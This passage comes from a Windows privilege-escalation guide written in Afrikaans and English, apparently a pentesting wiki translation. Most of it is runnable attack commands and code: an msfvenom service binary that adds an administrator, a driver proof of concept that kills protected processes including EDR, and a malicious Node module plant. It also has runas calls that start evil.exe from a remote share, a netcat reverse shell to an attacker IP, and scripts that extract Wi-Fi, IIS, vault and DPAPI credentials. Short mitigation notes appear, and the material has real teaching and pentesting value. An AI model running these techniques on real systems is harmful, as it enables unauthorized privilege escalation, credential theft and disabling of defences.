gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Jy kan** hierdie kwesbaarheid met metasploit opspoor en uitbuit: `exploit/windows/local/trusted\_service\_path` Jy kan handmatig 'n diens-binaire met metasploit skep:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows laat gebruikers toe om aksies te spesifiseer wat uitgevoer moet word as ’n diens misluk. Hierdie funksie kan gekonfigureer word om na ’n binary te wys. As hierdie binary vervangbaar is, kan privilege escalation moontlik wees. Meer besonderhede kan gevind word in die [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Installed Applications

Kontroleer **permissions of the binaries** (miskien kan jy een oorskryf en privileges eskaleer) en van die **folders** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Skryfregte

Kyk of jy een of ander konfigurasielêer kan verander om ’n spesiale lêer te lees, of of jy ’n binary kan verander wat deur ’n Administrator-rekening uitgevoer gaan word (schedtasks).

’n Manier om swak gids-/lêerregte in die stelsel te vind, is om:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ laai enige plugin DLL in onder sy `plugins` subvouers outomaties. As ’n skryfbare portable/kopie installasie teenwoordig is, gee die plasing van ’n kwaadwillige plugin outomatiese kode-uitvoering binne `notepad++.exe` op elke lansering (insluitend vanaf `DllMain` en plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Kyk of jy een of ander registry of binary kan oorskryf wat deur ’n ander gebruiker uitgevoer gaan word.**\
**Lees** die **volgende bladsy** om meer te leer oor interessante **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Soek vir moontlike **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
As ’n bestuurder ’n arbitrêre kernel read/write primitive blootstel (algemeen in swak ontwerpte IOCTL handlers), kan jy opgradeer deur ’n SYSTEM token direk uit kernel memory te steel. Sien die stap-vir-stap tegniek hier:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Vir race-condition bugs waar die kwesbare call ’n attacker-controlled Object Manager path oopmaak, kan die doelbewuste vertraag van die lookup (met max-length components of diep directory chains) die venster van mikrosekondes na tiene mikrosekondes rek:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Moderne hive vulnerabilities laat jou toe om deterministic layouts te groom, writable HKLM/HKU descendants te abuse, en metadata corruption in kernel paged-pool overflows te omskep sonder ’n custom driver. Leer die volle ketting hier:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Sommige drivers aanvaar ’n registry path van userland, valideer slegs dat dit ’n sinvolle UTF-16 string is, en roep dan `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` met `RTL_QUERY_REGISTRY_DIRECT` na ’n stack scalar soos `int readValue`. As `RTL_QUERY_REGISTRY_TYPECHECK` ontbreek, word `EntryContext` geïnterpreteer volgens die **werklike** registry type, nie die type wat die developer verwag het nie.

Dit skep twee nuttige primitives:

- **Confused deputy / oracle**: ’n user-controlled absolute `\Registry\...` path laat die driver attacker-chosen keys query, leak bestaan deur return codes/logs, en soms values lees waartoe die caller nie direk toegang kon kry nie.
- **Kernel memory corruption**: ’n scalar destination soos `&readValue` word type-confused as ’n `REG_QWORD`, `UNICODE_STRING`, of sized binary buffer, afhangend van die registry value type.

Praktiese exploitation notes:

- **Windows 8+ mitigation**: as die query ’n **untrusted hive** tref met `RTL_QUERY_REGISTRY_DIRECT` maar sonder `RTL_QUERY_REGISTRY_TYPECHECK`, crash kernel callers met `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Om exploitability te behou, soek na **attacker-writable keys binne trusted system hives** in plaas daarvan om values onder `HKCU` te stage.
- **Trusted-hive staging**: gebruik NtObjectManager om writable descendants van `\Registry\Machine` te enumerate, en voer die scan weer uit met ’n gedupliseerde **low-integrity** token om keys te vind wat vanaf sandboxed contexts bereikbaar is:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: ’n 8-byte direkte skryf na ’n 4-byte `int` beskadig aangrensende stack data en kan ’n nabygeleë callback/function pointer gedeeltelik oorskryf.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direkte mode verwag dat `EntryContext` na ’n `UNICODE_STRING` wys. As die code eers ’n aanvaller-beheerde `REG_DWORD` in ’n stack scalar laai en dan daardie selfde buffer vir ’n string read hergebruik, beheer die aanvaller `Length`/`MaximumLength` en beïnvloed gedeeltelik die `Buffer` pointer, wat ’n semi-beheerde kernel write oplewer.
- **`REG_BINARY`**: vir groot binary data behandel direkte mode die eerste `LONG` by `EntryContext` as ’n signed buffer size. As ’n vorige `REG_DWORD` read ’n **negatiewe** aanvaller-beheerde waarde in die hergebruikte scalar laat, kopieer die volgende `REG_BINARY` query aanvaller-bytes direk oor aangrensende stack slots, wat dikwels die skoonste pad na volledige callback-pointer overwrite is.

Sterk hunting pattern: **heterogeneous registry reads in dieselfde stack variable sonder om dit te reinitialize**. Grep vir `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, hergebruikte `EntryContext` pointers, en code paths waar die eerste registry read beheer of ’n tweede read gebeur.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Sommige signed third‑party drivers skep hul device object met ’n sterk SDDL via IoCreateDeviceSecure maar vergeet om FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics te stel. Sonder hierdie flag word die secure DACL nie afgedwing wanneer die device deur ’n path met ’n ekstra component oopgemaak word nie, wat enige unprivileged user toelaat om ’n handle te kry deur ’n namespace path soos:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (uit ’n real-world case)

Sodra ’n user die device kan oopmaak, kan privileged IOCTLs wat deur die driver blootgestel word, misbruik word vir LPE en tampering. Voorbeeldvermoëns wat in die wild waargeneem is:
- Gee full-access handles na arbitrêre processes terug (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Onbeperkte raw disk read/write (offline tampering, boot-time persistence tricks).
- Terminate arbitrêre processes, insluitend Protected Process/Light (PP/PPL), wat AV/EDR kill vanaf user land via kernel moontlik maak.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Versagtings vir ontwikkelaars
- Stel altyd FILE_DEVICE_SECURE_OPEN wanneer jy device objects skep wat bedoel is om deur ’n DACL beperk te word.
- Valideer caller context vir geprivilegieerde operasies. Voeg PP/PPL-kontroles by voordat jy process termination of handle returns toelaat.
- Beperk IOCTLs (access masks, METHOD_*, input validation) en oorweeg brokered models in plaas van direkte kernel privileges.

Opsporingsidees vir verdedigers
- Monitor user-mode opens van verdagte device names (bv. \\ .\\amsdk*) en spesifieke IOCTL sequences wat op misuse dui.
- Dwing Microsoft se vulnerable driver blocklist af (HVCI/WDAC/Smart App Control) en hou jou eie allow/deny lists by.


## PATH DLL Hijacking

As jy **write permissions binne ’n folder op PATH** het, kan jy moontlik ’n DLL hijack wat deur ’n proses gelaai word en **privileges escalate**.

Kontroleer permissions van alle folders binne PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Vir meer inligting oor hoe om hierdie check te abuse:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

This is 'n **Windows uncontrolled search path**-variant wat **Node.js**- en **Electron**-applications beïnvloed wanneer hulle 'n bare import soos `require("foo")` uitvoer en die verwagte module **missing** is.

Node resolve packages deur op en deur die directory tree te loop en `node_modules` folders op elke parent te check. Op Windows kan daardie walk die drive root bereik, so 'n application wat vanaf `C:\Users\Administrator\project\app.js` gelaunch word, kan uiteindelik die volgende probe:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

As 'n **low-privileged user** `C:\node_modules` kan create, kan hulle 'n malicious `foo.js` (of package folder) plant en wag vir 'n **higher-privileged Node/Electron process** om die missing dependency te resolve. Die payload execute in die security context van die victim process, so dit word **LPE** wanneer die target as 'n administrator loop, vanaf 'n elevated scheduled task/service wrapper, of vanaf 'n auto-started privileged desktop app.

Dit is veral common wanneer:

- 'n dependency in `optionalDependencies` declared is
- 'n third-party library `require("foo")` in `try/catch` wrap en op failure voortgaan
- 'n package uit production builds removed is, during packaging omitted is, of nie kon install nie
- die vulnerable `require()` diep inside die dependency tree lives in plaas van in die main application code

### Hunting vulnerable targets

Gebruik **Procmon** om die resolution path te prove:

- Filter by `Process Name` = target executable (`node.exe`, die Electron app EXE, of die wrapper process)
- Filter by `Path` `contains` `node_modules`
- Focus on `NAME NOT FOUND` en die final successful open onder `C:\node_modules`

Useful code-review patterns in unpacked `.asar` files or application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Identifiseer die **ontbrekende pakketnaam** uit Procmon of bronkode-oorsig.
2. Skep die root-soekgids as dit nog nie bestaan nie:
```powershell
mkdir C:\node_modules
```
3. Drop 'n module met die presiese verwagte naam:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Activeer die slagoffer-toepassing. As die toepassing `require("foo")` probeer en die legitieme module ontbreek, kan Node `C:\node_modules\foo.js` laai.

Werklike voorbeelde van ontbrekende opsionele modules wat by hierdie patroon pas, sluit `bluebird` en `utf-8-validate` in, maar die **technique** is die herbruikbare deel: vind enige **missing bare import** wat ’n geprivilegieerde Windows Node/Electron-proses sal oplos.

### Detectie- en hardening-idees

- Stel ’n waarskuwing in wanneer ’n gebruiker `C:\node_modules` skep of nuwe `.js`-lêers/pakkette daar skryf.
- Soek na hoë-integriteit prosesse wat vanaf `C:\node_modules\*` lees.
- Pak alle runtime-afhanklikhede in produksie in en oudit `optionalDependencies`-gebruik.
- Hersien derdeparty-kode vir stil `try { require("...") } catch {}`-patrone.
- Deaktiveer opsionele probes wanneer die biblioteek dit ondersteun (byvoorbeeld, sommige `ws`-ontplooiings kan die ou `utf-8-validate`-probe vermy met `WS_NO_UTF_8_VALIDATE=1`).

## Netwerk

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kyk vir ander bekende rekenaars wat hardgekodeer is in die hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Netwerk-koppelvlakke & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Oop Ports

Kontroleer vir **restricted services** van buite af
```bash
netstat -ano #Opened ports?
```
### Roeteringstabel
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tabel
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall-reëls

[**Kyk na hierdie bladsy vir Firewall-verwante opdragte**](../basic-cmd-for-pentesters.md#firewall) **(lys reëls, skep reëls, skakel af, skakel af...)**

Meer[ opdragte vir netwerk-enumerasie hier](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` kan ook gevind word in `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

As jy root user kry kan jy op enige port luister (die eerste keer wat jy `nc.exe` gebruik om op 'n port te luister sal dit via GUI vra of `nc` deur die firewall toegelaat moet word).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Om maklik bash as root te begin, kan jy `--default-user root` probeer

Jy kan die `WSL` lêerstelsel verken in die gids `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Die Windows Vault stoor gebruiker-geloofsbriewe vir servers, websites en ander programs wat **Windows** kan **log in die users automaticall**y. Op die eerste oogopslag kan dit lyk asof users nou hul Facebook-geloofsbriewe, Twitter-geloofsbriewe, Gmail-geloofsbriewe ens. kan stoor, sodat hulle outomaties via browsers aanmeld. Maar dit is nie so nie.

Windows Vault stoor geloofsbriewe wat Windows kan log in die users automatically, wat beteken dat enige **Windows application that needs credentials to access a resource** (server or a website) **can make use of this Credential Manager** & Windows Vault en die supplied credentials gebruik in plaas daarvan dat users die username en password heeltyd invoer.

Tensy die applications met Credential Manager interaksie het, dink ek nie dit is moontlik vir hulle om die credentials vir 'n gegewe resource te gebruik nie. So, as jou application van die vault gebruik wil maak, moet dit op een of ander manier **communicate with the credential manager and request the credentials for that resource** from the default storage vault.

Gebruik die `cmdkey` om die gestoor geloofsbriewe op die machine te lys.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Dan kan jy `runas` met die `/savecred`-opsies gebruik om die gestoorde geloofsbriewe te gebruik. Die volgende voorbeeld roep 'n afgeleë binary via 'n SMB share aan.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Gebruik `runas` met ’n verskafte stel geloofsbriewe.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

Die **Data Protection API (DPAPI)** verskaf ’n metode vir simmetriese enkripsie van data, hoofsaaklik gebruik binne die Windows-bedryfstelsel vir die simmetriese enkripsie van asimmetriese private sleutels. Hierdie enkripsie gebruik ’n gebruiker- of stelselgeheim om beduidend tot entropie by te dra.

**DPAPI maak die enkripsie van sleutels moontlik deur ’n simmetriese sleutel wat van die gebruiker se aanmeldgeheime afgelei word**. In scenario’s wat stelsel-enkripsie behels, gebruik dit die stelsel se domeinverifikasiegeheime.

Geënkripteerde gebruiker RSA-sleutels, deur DPAPI te gebruik, word in die `%APPDATA%\Microsoft\Protect\{SID}`-gids gestoor, waar `{SID}` die gebruiker se [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) verteenwoordig. **Die DPAPI-sleutel, saam met die master key wat die gebruiker se private sleutels in dieselfde lêer beskerm,** bestaan tipies uit 64 bytes ewekansige data. (Dit is belangrik om daarop te let dat toegang tot hierdie gids beperk is, wat verhoed dat die inhoud daarvan via die `dir`-opdrag in CMD gelys word, alhoewel dit deur PowerShell gelys kan word).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Jy kan die **mimikatz module** `dpapi::masterkey` gebruik met die toepaslike argumente (`/pvk` of `/rpc`) om dit te ontsyfer.

Die **credentials files protected by the master password** is gewoonlik geleë in:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **uittrek baie DPAPI** **masterkeys** uit **memory** met die `sekurlsa::dpapi` module (as jy root is).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** word dikwels gebruik vir **scripting** en outomatiseringstake as ’n manier om geënkripteerde credentials gerieflik te stoor. Die credentials word beskerm met behulp van **DPAPI**, wat tipies beteken dat hulle net deur dieselfde user op dieselfde computer ontkripteer kan word waar hulle geskep is.

Om ’n PS credentials uit die file wat dit bevat te **decrypt**, kan jy doen:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Gestoorde RDP-verbindings

Jy kan hulle vind in `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
en in `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Onlangs Uitgevoerde Opdragte
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Gebruik die **Mimikatz** `dpapi::rdg` module met die toepaslike `/masterkey` om **enige .rdg-lêers te dekripteer**\
Jy kan baie DPAPI masterkeys uit geheue onttrek met die Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Mense gebruik dikwels die StickyNotes-app op Windows-werkstasies om **wagwoorde** en ander inligting te stoor, sonder om te besef dit is ’n databasislêer. Hierdie lêer is geleë by `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` en is altyd die moeite werd om te soek en te ondersoek.

### AppCmd.exe

**Let daarop dat om wagwoorde van AppCmd.exe te herwin, jy Administrateur moet wees en onder ’n High Integrity-vlak moet werk.**\
**AppCmd.exe** is geleë in die `%systemroot%\system32\inetsrv\`-lêergids.\
As hierdie lêer bestaan, is dit moontlik dat sommige **credentials** gekonfigureer is en **herwin** kan word.

Hierdie kode is onttrek uit [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Kontroleer of `C:\Windows\CCM\SCClient.exe` bestaan .\
Installeerders word **met SYSTEM-voorregte** uitgevoer, baie is kwesbaar vir **DLL Sideloading (Info van** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Lêers en Register (Geloofsbriewe)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys kan in die registry-sleutel `HKCU\Software\OpenSSH\Agent\Keys` gestoor word, so jy moet kyk of daar enigiets interessant daarin is:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
As jy enige inskrywing binne daardie pad vind, is dit waarskynlik ’n gestoorde SSH-sleutel. Dit word geïnkripteer gestoor, maar kan maklik gedekripteer word met behulp van [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Meer inligting oor hierdie tegniek hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

As die `ssh-agent`-diens nie loop nie en jy wil hê dit moet outomaties begin tydens opstart, voer uit:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Dit lyk of hierdie tegniek nie meer geldig is nie. Ek het probeer om some ssh keys te skep, dit met `ssh-add` by te voeg en via ssh by ’n masjien aan te meld. Die register HKCU\Software\OpenSSH\Agent\Keys bestaan nie en procmon het nie die gebruik van `dpapi.dll` tydens die asymmetric key authentication geïdentifiseer nie.

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Jy kan ook na hierdie lêers soek met **metasploit**: _post/windows/gather/enum_unattend_

Voorbeeldinhoud:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM-rugsteun
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Soek vir ’n lêer genaamd **SiteList.xml**

### Cached GPP Pasword

’n Funksie was voorheen beskikbaar wat die ontplooiing van pasgemaakte plaaslike administrateurrekeninge op ’n groep masjiene via Group Policy Preferences (GPP) toegelaat het. Hierdie metode het egter ernstige sekuriteitsfoute gehad. Eerstens kon die Group Policy Objects (GPOs), wat as XML-lêers in SYSVOL gestoor is, deur enige domain user verkry word. Tweedens kon die wagwoorde binne hierdie GPPs, geënkripteer met AES256 deur ’n publiek gedokumenteerde verstek sleutel, deur enige geverifieerde gebruiker gedekripteer word. Dit het ’n ernstige risiko ingehou, aangesien dit gebruikers kon toelaat om verhoogde privileges te verkry.

Om hierdie risiko te verminder, is ’n funksie ontwikkel om vir plaaslik gekaste GPP-lêers te skandeer wat ’n "cpassword"-veld bevat wat nie leeg is nie. Sodra so ’n lêer gevind word, dekripteer die funksie die wagwoord en gee ’n pasgemaakte PowerShell-objek terug. Hierdie objek sluit besonderhede oor die GPP en die lêer se ligging in, wat help met die identifisering en remediëring van hierdie sekuriteitskwesbaarheid.

Soek in `C:\ProgramData\Microsoft\Group Policy\history` of in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (voor W Vista)_ vir hierdie lêers:

- Groups.xml
- Services.xml
